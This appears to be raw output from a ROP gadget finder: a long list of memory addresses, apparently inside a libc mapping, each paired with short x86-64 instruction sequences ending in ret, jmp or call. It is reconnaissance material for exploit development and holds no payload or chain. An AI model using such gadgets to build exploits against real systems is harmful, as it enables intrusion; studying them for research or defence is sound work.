0x00002aaaaab7c335 : adc al, 0x48 ; lea edi, dword ptr [rdi + 0x14] ; jne 0xa7a9b ; ret
0x00002aaaaaaf5825 : adc al, 0x48 ; mov edx, dword ptr [rax] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaac84d4c : adc al, 0x4e ; add dword ptr [rax], eax ; push rax ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6cbe0 : adc al, 0x52 ; call rsp
0x00002aaaaac6b8b0 : adc al, 0x59 ; in eax, dx ; dec esp ; test eax, 0x59440000 ; in eax, dx ; jmp rsp
0x00002aaaaab45b6b : adc al, 0x5b ; mov eax, 1 ; pop rbp ; pop r12 ; ret
0x00002aaaaac5ba0c : adc al, 0x5e ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaab09acb : adc al, 0x66 ; movaps xmm0, xmm1 ; jne 0x34aeb ; add rsp, 0x28 ; ret
0x00002aaaaac86e4c : adc al, 0x6f ; add dword ptr [rax], eax ; push rax ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaab5a7aa : adc al, 0x77 ; and ecx, dword ptr [rcx - 0x7d] ; ret 0xeb5b
0x00002aaaaabab05a : adc al, 0x80 ; mov eax, 0 ; cmove eax, esi ; ret
0x00002aaaaab03c97 : adc al, 0x88 ; add rax, rdx ; jmp rax
0x00002aaaaabcbb36 : adc al, 0x89 ; ret 0xdaf7
0x00002aaaaab47eee : adc al, 0x8a ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x00002aaaaabd2580 : adc al, 0x8a ; sub al, 0 ; ret
0x00002aaaaab30f54 : adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaab38e47 : adc al, 0x91 ; add rcx, rdx ; jmp rcx
0x00002aaaaabb56b4 : adc al, 0x91 ; add rdx, rcx ; jmp rdx
0x00002aaaaac1c9d0 : adc al, 0x91 ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x00002aaaaac1b0fe : adc al, 0x91 ; sub eax, edx ; ret
0x00002aaaaac25501 : adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab5973a : adc al, 0x98 ; add rax, rdx ; jmp rax
0x00002aaaaab5e1e7 : adc al, 0xa ; jmp r10
0x00002aaaaab73b73 : adc al, 0xa ; sub eax, edx ; ret
0x00002aaaaab3114a : adc al, 0xa0 ; add rax, rdx ; jmp rax
0x00002aaaaabadf67 : adc al, 0xa8 ; add rax, rdx ; jmp rax
0x00002aaaaac6ba68 : adc al, 0xa8 ; in eax, dx ; call rsp
0x00002aaaaaba212d : adc al, 0xb0 ; add rax, rdx ; jmp rax
0x00002aaaaabdef94 : adc al, 0xb2 ; add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaac7bd4c : adc al, 0xbe ; add byte ptr [rax], al ; and byte ptr [rdi - 0x11], bh ; call qword ptr [rdi]
0x00002aaaaabd8990 : adc al, 0xbf ; int1 ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaab1d031 : adc al, 0xc0 ; mov qword ptr [rsi + rax*8], rdx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab1d035 : adc al, 0xc6 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0af44 : adc al, 0xc7 ; xor eax, eax ; ret
0x00002aaaaac7ca4c : adc al, 0xcb ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac6bc40 : adc al, 0xd8 ; in eax, dx ; jmp rsp
0x00002aaaaac7dd4c : adc al, 0xde ; add byte ptr [rax], al ; add byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaab8f6a2 : adc al, 0xe ; jne 0xba69d ; ret
0x00002aaaaac19211 : adc al, 0xe ; sub eax, edx ; ret
0x00002aaaaac7e44c : adc al, 0xe5 ; add byte ptr [rax], al ; mov al, 0xe8 ; int1 ; call qword ptr [rbx]
0x00002aaaaaad7b87 : adc al, 0xe7 ; ret
0x00002aaaaac71569 : adc al, 0xe9 ; call qword ptr [rdi]
0x00002aaaaab959a5 : adc al, 0xe9 ; ret 0xffef
0x00002aaaaab96a5c : adc al, 0xe9 ; ret 0xfff9
0x00002aaaaac48271 : adc al, 0xea ; test rdx, rdx ; je 0x173281 ; call rdx
0x00002aaaaac6bde9 : adc al, 0xee ; jmp rsp
0x00002aaaaac2627b : adc al, 0xf ; sub dword ptr [rdi - 0x20], esp ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaab7c339 : adc al, 0xf ; test dword ptr [rax + 7], edx ; add byte ptr [rax], al ; ret
0x00002aaaaac7f071 : adc al, 0xf2 ; call qword ptr [rdx]
0x00002aaaaab7afa9 : adc al, 0xf3 ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dl ; ret
0x00002aaaaac6d2d9 : adc al, 0xf5 ; call rsp
0x00002aaaaac6d2d1 : adc al, 0xf5 ; push qword ptr [rcx + 0x14940001] ; cmc ; call rsp
0x00002aaaaac6d709 : adc al, 0xf6 ; call rsp
0x00002aaaaac69b1d : adc al, 0xfc ; call qword ptr [rax]
0x00002aaaaac6bcf8 : adc al, 0xfc ; in eax, dx ; call rsp
0x00002aaaaab9bdcf : adc al, 0xff ; lea rax, qword ptr [rax + rdx*8] ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac46c28 : adc al, 1 ; add byte ptr [rax], al ; ret
0x00002aaaaab529bf : adc al, 2 ; add byte ptr [rax], al ; mov rdx, rax ; jmp 0x7d9e6
0x00002aaaaabfc74c : adc al, 3 ; sub al, byte ptr [rax] ; test eax, eax ; je 0x127760 ; ret
0x00002aaaaac28346 : adc al, 4 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab8e38f : adc al, 5 ; add byte ptr [rbp + 0x390a74db], al ; ret
0x00002aaaaab73006 : adc al, 7 ; cmp edx, esi ; je 0x9e007 ; ret
0x00002aaaaab72f32 : adc al, 7 ; test dl, dl ; jne 0x9df2f ; ret
0x00002aaaaac7074c : adc al, 8 ; add byte ptr [rax], al ; test bpl, al ; jmp qword ptr [rcx]
0x00002aaaaab19e0f : adc al, 9 ; ret 0x9f74
0x00002aaaaac28534 : adc al, byte ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac1b6e7 : adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1b751 : adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaaada7e8 : adc al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaaadc600 : adc al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 4
0x00002aaaaaad57ba : adc al, byte ptr [rax] ; add byte ptr [rbx + 1], al ; ret 0x102
0x00002aaaaaaf6bdd : adc al, byte ptr [rax] ; mov rdi, rbx ; call r14
0x00002aaaaaaf72bb : adc al, byte ptr [rax] ; mov rdi, rbx ; mov rax, qword ptr [rbp - 0x58] ; call rax
0x00002aaaaab38882 : adc al, byte ptr [rax] ; movsxd rax, dword ptr [rcx + rax*4] ; add rcx, rax ; jmp rcx
0x00002aaaaab30f50 : adc al, byte ptr [rax] ; movsxd rdx, dword ptr [rax + rdx*4] ; add rax, rdx ; jmp rax
0x00002aaaaab38e43 : adc al, byte ptr [rax] ; movsxd rdx, dword ptr [rcx + rdx*4] ; add rcx, rdx ; jmp rcx
0x00002aaaaab84a0d : adc al, byte ptr [rbx - 0x76b7cf05] ; call 0x4ccd8f30
0x00002aaaaab89eb5 : adc al, byte ptr [rbx - 0x76b7cf05] ; call 0x4ccde3d8
0x00002aaaaac7f9ea : adc al, byte ptr [rbx] ; ret 0xa02
0x00002aaaaac81165 : adc al, byte ptr [rcx] ; add al, bl ; fpatan ; call qword ptr [rsi]
0x00002aaaaac811a5 : adc al, byte ptr [rcx] ; add al, bl ; fpatan ; jmp qword ptr [rcx]
0x00002aaaaac811bd : adc al, byte ptr [rcx] ; add al, dh ; fpatan ; jmp qword ptr [rcx]
0x00002aaaaac81235 : adc al, byte ptr [rcx] ; add byte ptr [rax - 0x26], ch ; jmp qword ptr [rcx]
0x00002aaaaac8121d : adc al, byte ptr [rcx] ; add byte ptr [rax - 0x26], dl ; jmp qword ptr [rcx]
0x00002aaaaab76e64 : adc al, byte ptr [rcx] ; movlpd qword ptr [rdx], xmm0 ; mov rax, rdi ; ret
0x00002aaaaabc793e : adc al, ch ; insb byte ptr [rdi], dx ; mov bl, 0xf9 ; dec dword ptr [rax - 0x77] ; ret 0x3145
0x00002aaaaab9d9fd : adc al, ch ; popfq ; outsb dx, byte ptr [rsi] ; cmc ; dec dword ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaaba5dc7 : adc al, ch ; ret
0x00002aaaaac89c80 : adc bh, 0xf6 ; call qword ptr [rdi]
0x00002aaaaac696b0 : adc bh, 0xfb ; inc dword ptr [rax - 0x27] ; sti ; jmp qword ptr [rax]
0x00002aaaaac69b15 : adc bh, ah ; push qword ptr [rax + 0x13] ; cld ; inc eax ; adc al, 0xfc ; call qword ptr [rax]
0x00002aaaaac8ef21 : adc bh, al ; jmp qword ptr [rbx]
0x00002aaaaac83850 : adc bh, bh ; hlt ; call rsi
0x00002aaaaac698b0 : adc bh, bh ; sti ; call rax
0x00002aaaaaad8afb : adc bh, byte ptr [rax] ; cwde ; ret
0x00002aaaaab80c70 : adc bh, byte ptr [rbx] ; ja 0xabc84 ; cmove rax, rcx ; ret
0x00002aaaaac5c2e4 : adc bh, ch ; int1 ; jmp qword ptr [rax]
0x00002aaaaabb6429 : adc bh, dh ; ret 0x30f
0x00002aaaaabf25c4 : adc bh, dh ; ret 0x8080
0x00002aaaaabf849b : adc bl, al ; nop dword ptr [rax] ; mov eax, 0xffffffff ; ret
0x00002aaaaab09f38 : adc bl, bl ; insb byte ptr [rdi], dx ; and al, 8 ; ret
0x00002aaaaab63db5 : adc bl, ch ; call 0xffffffffc3d9770a
0x00002aaaaab5dec5 : adc bl, ch ; call 0xffffffffc401181a
0x00002aaaaab5f6c5 : adc bl, ch ; call 0xffffffffc401301a
0x00002aaaaab1d982 : adc bl, ch ; jno 0x489d8 ; shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x00002aaaaab636d4 : adc bl, dh ; movq qword ptr [rdi + rdx - 0x20], mm0 ; ret
0x00002aaaaab7af56 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], cl ; ret
0x00002aaaaab7a2d6 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x00002aaaaab7a2c6 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7a337 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00002aaaaab7a297 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab7a438 : adc bl, dh ; movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00002aaaaab02a6a : adc bl, dh ; ret
0x00002aaaaab7af55 : adc bl, r14b ; movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], cl ; ret
0x00002aaaaab7a2c5 : adc bl, r14b ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7a336 : adc bl, r14b ; movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00002aaaaab7a296 : adc bl, r14b ; movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab4e616 : adc byte ptr [r11 + 6], r14b ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaabe95a1 : adc byte ptr [r13 - 0xcf68a40], r8b ; ret
0x00002aaaaab5d7d2 : adc byte ptr [r15], cl ; mov dh, 0xc ; adc dword ptr [rax - 0x7d], ecx ; ret 0x8801
0x00002aaaaab0c37d : adc byte ptr [r15], cl ; xchg eax, ebx ; ret 0x3948
0x00002aaaaab0ceca : adc byte ptr [r15], r9b ; xchg eax, ebx ; ret 0x3949
0x00002aaaaab0c376 : adc byte ptr [r8 + 0x39], r9b ; ret
0x00002aaaaac17a07 : adc byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00002aaaaab7e22f : adc byte ptr [r8 - 0x12cfeba9], r9b ; mov byte ptr [rdi + 0x15], ch ; ret
0x00002aaaaab9c909 : adc byte ptr [r8 - 0x77], cl ; out dx, al ; xor edx, edx ; jmp 0xc78dd
0x00002aaaaab51d7c : adc byte ptr [r8 - 0x77], cl ; ret 0x348
0x00002aaaaaba38d5 : adc byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaab7e1ac : adc byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x11], ch ; ret
0x00002aaaaab7e1ce : adc byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x12], ch ; ret
0x00002aaaaab7e20c : adc byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x14], ch ; ret
0x00002aaaaab7e28e : adc byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x18], ch ; ret
0x00002aaaaab49083 : adc byte ptr [r9 + 0x2b], r9b ; or byte ptr [r8 + 0x29], r9b ; ret
0x00002aaaaab51894 : adc byte ptr [r9], r13b ; rol bl, 1 ; mov eax, 0xffffffff ; ret
0x00002aaaaab1d57c : adc byte ptr [rax + 0x29], cl ; ret
0x00002aaaaab27b9f : adc byte ptr [rax + 0x29], cl ; ret 0x8b48
0x00002aaaaab0c377 : adc byte ptr [rax + 0x39], cl ; ret
0x00002aaaaac0a492 : adc byte ptr [rax + 0x39], cl ; ret 0x1872
0x00002aaaaabdceaf : adc byte ptr [rax + 0x39], cl ; ret 0x1b72
0x00002aaaaabb6861 : adc byte ptr [rax + 0x39], cl ; ret 0x2575
0x00002aaaaabb6886 : adc byte ptr [rax + 0x39], cl ; ret 0xe474
0x00002aaaaab537eb : adc byte ptr [rax + 0x39], cl ; ret 0xef75
0x00002aaaaac0a491 : adc byte ptr [rax + 0x39], r9b ; ret 0x1872
0x00002aaaaabdceae : adc byte ptr [rax + 0x39], r9b ; ret 0x1b72
0x00002aaaaac17a08 : adc byte ptr [rax + 0x5a], bl ; pop rbx ; ret
0x00002aaaaabb053f : adc byte ptr [rax + 0xc], bh ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4db3b : adc byte ptr [rax + 0xf], cl ; ret 0x8948
0x00002aaaaabddb0a : adc byte ptr [rax + 0xf], cl ; scasd eax, dword ptr [rdi] ; ret 0xf48
0x00002aaaaac0112b : adc byte ptr [rax + 1], bh ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac02f8a : adc byte ptr [rax + 1], bh ; pop rbx ; ret
0x00002aaaaac06726 : adc byte ptr [rax + 1], bh ; ret
0x00002aaaaab7f3de : adc byte ptr [rax + 1], cl ; clc ; ret
0x00002aaaaab1e06e : adc byte ptr [rax + 1], cl ; ret
0x00002aaaaab735b6 : adc byte ptr [rax + 1], cl ; ret 0x147c
0x00002aaaaabde638 : adc byte ptr [rax + 1], cl ; ret 0x3948
0x00002aaaaac09ded : adc byte ptr [rax + 1], dil ; ret
0x00002aaaaabad25f : adc byte ptr [rax + 2], bh ; ret
0x00002aaaaac28736 : adc byte ptr [rax + rax], al ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7e3b4 : adc byte ptr [rax - 0x12cfdfb1], cl ; mov byte ptr [rdi + 0x21], ch ; ret
0x00002aaaaab7e2b2 : adc byte ptr [rax - 0x12cfe7b1], cl ; mov byte ptr [rdi + 0x19], ch ; ret
0x00002aaaaab7e230 : adc byte ptr [rax - 0x12cfeba9], cl ; mov byte ptr [rdi + 0x15], ch ; ret
0x00002aaaaac74bf0 : adc byte ptr [rax - 0x15], dl ; call rdi
0x00002aaaaabd1e63 : adc byte ptr [rax - 0x39], cl ; ret 0xffff
0x00002aaaaac6a978 : adc byte ptr [rax - 0x606f0004], ah ; cld ; call qword ptr [rax]
0x00002aaaaabdef91 : adc byte ptr [rax - 0x73], cl ; adc al, 0xb2 ; add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaac3cce4 : adc byte ptr [rax - 0x73], cl ; adc byte ptr [rdi], cl ; test dword ptr [rcx + 5], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab02a63 : adc byte ptr [rax - 0x73], cl ; add al, 0xb7 ; mov eax, dword ptr [rax + rdx] ; ret
0x00002aaaaab62a94 : adc byte ptr [rax - 0x73], cl ; add eax, 0x1ba24 ; cmove rax, rdx ; ret
0x00002aaaaab63874 : adc byte ptr [rax - 0x73], cl ; jg 0x8e893 ; jne 0x8e86a ; mov rax, rdi ; ret
0x00002aaaaab68934 : adc byte ptr [rax - 0x73], cl ; jg 0x93951 ; jne 0x93928 ; ret
0x00002aaaaab7abab : adc byte ptr [rax - 0x73], cl ; jg 0xa5bcb ; jne 0xa628b ; ret
0x00002aaaaab7c28f : adc byte ptr [rax - 0x73], cl ; jg 0xa72af ; jne 0xa7a9b ; ret
0x00002aaaaabdf1b5 : adc byte ptr [rax - 0x73], cl ; or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x00002aaaaabdf1b4 : adc byte ptr [rax - 0x73], r9b ; or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x00002aaaaaaf5828 : adc byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x00002aaaaabf4367 : adc byte ptr [rax - 0x75], cl ; je 0x11f39a ; or byte ptr [rcx + rcx*4 - 0x11], cl ; call r12
0x00002aaaaabc85ca : adc byte ptr [rax - 0x75], cl ; jl 0xf35fe ; mov qword ptr [r14], rbx ; call 0x1f8b3
0x00002aaaaab68d5a : adc byte ptr [rax - 0x75], cl ; sbb byte ptr [rax - 0x7d], r9b ; ret 0x4802
0x00002aaaaab79cac : adc byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaabe30c2 : adc byte ptr [rax - 0x77], cl ; imul edx, dword ptr [rax], 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab46c77 : adc byte ptr [rax - 0x77], cl ; jo 0x71c95 ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab47fac : adc byte ptr [rax - 0x77], cl ; or cl, byte ptr [rax - 0x77] ; ret
0x00002aaaaab9c90a : adc byte ptr [rax - 0x77], cl ; out dx, al ; xor edx, edx ; jmp 0xc78dc
0x00002aaaaac0043b : adc byte ptr [rax - 0x77], cl ; out dx, eax ; call r14
0x00002aaaaab46c37 : adc byte ptr [rax - 0x77], cl ; push rax ; adc byte ptr [rax - 0x77], cl ; ret
0x00002aaaaaaf8654 : adc byte ptr [rax - 0x77], cl ; push rbp ; test al, 0xe8 ; ret 0xffff
0x00002aaaaab5d622 : adc byte ptr [rax - 0x77], cl ; push rbx ; sbb byte ptr [rax - 0x77], cl ; ret 0x348
0x00002aaaaab0e2b3 : adc byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab51d7d : adc byte ptr [rax - 0x77], cl ; ret 0x348
0x00002aaaaabea0e6 : adc byte ptr [rax - 0x77], cl ; ret 0x8548
0x00002aaaaab36d02 : adc byte ptr [rax - 0x77], cl ; ret 0x860f
0x00002aaaaab126d4 : adc byte ptr [rax - 0x77], cl ; ret 0x875
0x00002aaaaab571e9 : adc byte ptr [rax - 0x77], cl ; ret 0x8d4e
0x00002aaaaac03f34 : adc byte ptr [rax - 0x77], cl ; ret 0x948
0x00002aaaaabb9b54 : adc byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaac2207f : adc byte ptr [rax - 0x77], cl ; ror dword ptr [rax - 0x77], 1 ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaac39c07 : adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x00002aaaaac39c43 : adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret
0x00002aaaaab75a54 : adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret 0x13
0x00002aaaaabf7890 : adc byte ptr [rax - 0x7b], cl ; sal byte ptr [rdx + rbp*2 + 0x48], 0x39 ; ret 0x5576
0x00002aaaaab72d93 : adc byte ptr [rax - 0x7d], cl ; mov dword ptr [rcx + rcx*4], 0x8948fc47 ; clc ; ret
0x00002aaaaab30ce1 : adc byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab5b6e3 : adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaaafb56a : adc byte ptr [rax - 0x7d], cl ; ret 0x4804
0x00002aaaaab1dd91 : adc byte ptr [rax - 0x7d], cl ; ret 0x4810
0x00002aaaaab1e5a9 : adc byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaabd2c67 : adc byte ptr [rax - 0x7d], cl ; ret 0xf01
0x00002aaaaac6aa10 : adc byte ptr [rax - 0x7eaf0004], al ; cld ; call rax
0x00002aaaaac84f00 : adc byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaabd0d50 : adc byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabbedbb : adc byte ptr [rax - 1], bh ; ret
0x00002aaaaabd073b : adc byte ptr [rax], al ; add bl, al ; nop ; xor eax, eax ; ret
0x00002aaaaac51975 : adc byte ptr [rax], al ; add byte ptr [rax + rdx + 0x10bf0000], bh ; add byte ptr [rax], al ; ret 0x10
0x00002aaaaab3fbcc : adc byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; ret
0x00002aaaaac1d961 : adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1b8f1 : adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaab97569 : adc byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; ror byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab1019c : adc byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaac01cea : adc byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rsi + 8], rax ; ret
0x00002aaaaac00385 : adc byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x00002aaaaab7f113 : adc byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab5ffac : adc byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac5efed : adc byte ptr [rax], al ; add byte ptr [rax], al ; ret 1
0x00002aaaaab40454 : adc byte ptr [rax], al ; add byte ptr [rax], al ; test ecx, ecx ; je 0x6b469 ; ret
0x00002aaaaabe9b41 : adc byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaab2c449 : adc byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg dword ptr [rbx + rcx], esi ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac69810 : adc byte ptr [rax], al ; cld ; call rax
0x00002aaaaab5f6e6 : adc byte ptr [rax], al ; je 0x8a6fc ; lea rax, qword ptr [rip + 0xbf30f] ; ret
0x00002aaaaab61b56 : adc byte ptr [rax], al ; je 0x8cb6c ; lea rax, qword ptr [rip + 0xbcfdf] ; ret
0x00002aaaaab61ee6 : adc byte ptr [rax], al ; je 0x8cefc ; lea rax, qword ptr [rip + 0xbcd7f] ; ret
0x00002aaaaab5cca5 : adc byte ptr [rax], al ; mov rdx, rcx ; jmp 0x87c74
0x00002aaaaab5cca4 : adc byte ptr [rax], al ; mov rdx, rcx ; jmp 0x87c75
0x00002aaaaab59736 : adc byte ptr [rax], al ; movsxd rdx, dword ptr [rax + rbx*4] ; add rax, rdx ; jmp rax
0x00002aaaaab1aafb : adc byte ptr [rax], al ; ret
0x00002aaaaac69210 : adc byte ptr [rax], al ; sti ; jmp rax
0x00002aaaaabad2d5 : adc byte ptr [rax], bh ; ret 0x860f
0x00002aaaaabad1f8 : adc byte ptr [rax], bh ; ret 0x870f
0x00002aaaaac6927c : adc byte ptr [rax], bl ; sti ; inc dword ptr [rax] ; sbb ebx, edi ; push rax ; sbb ebx, edi ; jmp rax
0x00002aaaaac69aa4 : adc byte ptr [rax], dh ; cld ; call qword ptr [rax]
0x00002aaaaab7e1ad : adc byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x11], ch ; ret
0x00002aaaaab7e1cf : adc byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x12], ch ; ret
0x00002aaaaab7e20d : adc byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x14], ch ; ret
0x00002aaaaab7e28f : adc byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x18], ch ; ret
0x00002aaaaab7e391 : adc byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x20], ch ; ret
0x00002aaaaabbc241 : adc byte ptr [rbp + 0x39], al ; enter -0x2e89, 0x39 ; ret
0x00002aaaaab53bda : adc byte ptr [rbp + 0x39], cl ; ret
0x00002aaaaaae5af0 : adc byte ptr [rbp + 0xa], dh ; add byte ptr [rax], al ; ret
0x00002aaaaab1d525 : adc byte ptr [rbp + rcx*4 + 0x34], cl ; ret 0x8d4a
0x00002aaaaac694a4 : adc byte ptr [rbp + rdi*8 - 0x25b6f01], ah ; call qword ptr [rax]
0x00002aaaaab63878 : adc byte ptr [rbp - 0x1b], dh ; mov rax, rdi ; ret
0x00002aaaaab68938 : adc byte ptr [rbp - 0x1b], dh ; ret
0x00002aaaaac694ac : adc byte ptr [rbp - 0x5a6f0003], ah ; std ; call qword ptr [rax]
0x00002aaaaabf810d : adc byte ptr [rbp - 0x78], al ; sbb al, byte ptr [rbp - 0x78] ; add dword ptr [rcx - 0x7d], ecx ; ret 0x4c02
0x00002aaaaab98e43 : adc byte ptr [rbp - 0x7b], al ; ror byte ptr [rdi], 0x84 ; ret 1
0x00002aaaaabd70b7 : adc byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x84 ; ret 0
0x00002aaaaabe95a2 : adc byte ptr [rbp - 0xcf68a40], al ; ret
0x00002aaaaab80da2 : adc byte ptr [rbp - 0xd], dh ; ret
0x00002aaaaac69fb0 : adc byte ptr [rbp - 4], dl ; call qword ptr [rax + 0x10fffc54]
0x00002aaaaac46d2f : adc byte ptr [rbx + 0x463bfc47], cl ; cld ; jne 0x171d4b ; xor eax, eax ; ret
0x00002aaaaab57320 : adc byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab5950b : adc byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab0fdb0 : adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac7a293 : adc byte ptr [rbx + 0xa440202], al ; ret
0x00002aaaaac761ad : adc byte ptr [rbx + 0xa], ch ; ret
0x00002aaaaac746fc : adc byte ptr [rbx + 0xaae0202], al ; ret
0x00002aaaaab4e617 : adc byte ptr [rbx + 6], dh ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaac69224 : adc byte ptr [rbx + rdi*8], al ; jmp rax
0x00002aaaaab51892 : adc byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x00002aaaaab4aad7 : adc byte ptr [rbx - 0x3f7a8fb9], cl ; js 0x75af1 ; ret
0x00002aaaaab5d643 : adc byte ptr [rbx - 0x48], bl ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbp ; pop r12 ; ret
0x00002aaaaac6a960 : adc byte ptr [rbx - 0x5d6f0004], ah ; cld ; call qword ptr [rax]
0x00002aaaaab7edb0 : adc byte ptr [rbx - 0x6bf0fd06], al ; ret 0x8444
0x00002aaaaabf811b : adc byte ptr [rbx - 0x73], al ; add dword ptr [rdx], r8d ; pop rbx ; ret
0x00002aaaaab80def : adc byte ptr [rbx - 0x7cb703ba], cl ; ret
0x00002aaaaabe9736 : adc byte ptr [rbx - 0x7d], bl ; loopne 0x11474f ; pop rbp ; pop r12 ; ret
0x00002aaaaac692f4 : adc byte ptr [rbx - 5], cl ; push rax ; sti ; call rax
0x00002aaaaac5c450 : adc byte ptr [rbx], al ; jmp qword ptr [rax]
0x00002aaaaac69a28 : adc byte ptr [rbx], dh ; cld ; call qword ptr [rax]
0x00002aaaaac74b10 : adc byte ptr [rbx], dh ; jmp 0x19fb16
0x00002aaaaab49084 : adc byte ptr [rcx + 0x2b], cl ; or byte ptr [r8 + 0x29], r9b ; ret
0x00002aaaaab4862f : adc byte ptr [rcx + 0x5c], al ; pop r13 ; pop r14 ; sar rax, 2 ; ret
0x00002aaaaab69577 : adc byte ptr [rcx + 1], cl ; ret 0x1b8
